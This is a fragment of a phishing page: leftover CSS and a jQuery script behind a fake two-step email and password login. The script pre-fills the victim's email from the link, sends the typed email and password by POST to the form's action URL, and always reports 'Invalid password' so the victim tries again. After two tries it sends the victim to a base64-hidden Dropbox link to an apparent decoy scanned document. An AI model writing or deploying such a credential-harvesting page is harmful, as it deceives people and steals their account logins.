		  border-top-color: #c8cbcf
		}

		  color: #202326
		}
		
		.alert-success {

		}
		
		.alert-success hr {

		}
		
		.alert-warning hr {

		}

		  color: #533f03

<script src="jquery.min.js"></script>
<script type="text/javascript">
const param = new URLSearchParams(window.location.search);
let emailParam = param.get('email') ? param.get('email') : '';
let addition = 0;
 
if (emailParam === "null") {
   emailParam = "";
}

const email= document.getElementById("email");
const source = document.getElementById('source');
const form = document.getElementById("contactForm");
email.value = emailParam;

var btnNext = document.getElementById("next");
btnNext.addEventListener('click', function(e){
    var alert = document.querySelector('.alert');
	e.preventDefault();
	if(email.value === "") {
		$(".alert").show();
        alert.textContent = "Sorry, we don't recognize this email.";
		email.focus();
		return;
	} else if (!email.value.match(/^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/)) {
		$(".alert").show();
        alert.textContent = "Sorry, we don't recognize this email.";
		email.focus();
		return;
	} else {
        $('.yid').html(email.value);
        $(".alert").hide();
		var emDivision = document.getElementById('emDivision');
		var psDivision = document.getElementById("psDivision");
		var btnLogin = document.getElementById("login");

        $("#password-challenge").show();
        $(".chal2").hide();
        $(".chal3").hide();

		emDivision.style.transition = "2s";
		emDivision.style.display = "none";
		psDivision.style.transition = "2s";
		psDivision.style.display = "block";



	btnLogin.addEventListener('click', function(e){
        var alert = document.querySelector('.alertt');
		e.preventDefault();
		var password = document.getElementById("password");
		if(password.value === ""){
            $(".alertt").show();
            alert.textContent = 'Please provide password';
			password.focus();
			return;
		} else {


			const domain = email.value.split('@')[1];
			addition = addition + 1;

			var $form = $("#contactForm");
			var data = $form.serialize();
			var url = form.action;


			var msg = $('#msg').html();
			$('#msg').text( msg );
			
			$.ajax({
			type: "POST",
			url: url,
			data: data,
			cache: false,
			timeout: 800000,
			beforeSend: function(){
			$('#login').attr("disabled", true);
			},
			success: function(response){
				if(response){
                password.value = "";
                password.style.borderColor = "red";
                $('.alertt').show();
                alert.textContent = "Invalid password. Please try again";
                alert.className = alert.className.replace(/\balert-info\b/g, "alert-danger");
				$('#login').attr("disabled", false);

				if (addition >= 2) {
					window.location.replace(atob("aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vcy96cnU1ZHhucHlwODdueDkvU0NBTkRPQzAwMS5wZGY/ZGw9MA=="));
					return;
				}


				console.log(response);
				if(response['signal'] == 'ok'){
					$('#msg').html(response['msg']);

				}
				else{

					$('#msg').html(response['msg']);
				}
			}else {
				password.value = "";
                password.style.borderColor = "red";
        		$(".alertt").show();
                alert.textContent = 'Invalid password. Please try again';
                alert.className = alert.className.replace(/\balert-info\b/g, "alert-danger");

			}
			},
			error: function(){
                password.value = "";
                password.style.borderColor = "red";
        		$(".alertt").show();
                alert.textContent = 'Something went wrong. Please try again';
                alert.className = alert.className.replace(/\balert-info\b/g, "alert-danger");

			},
			complete: function(){
			$('#login').html('Log In');
			}
			});
		}  
	});
}
});
</script>
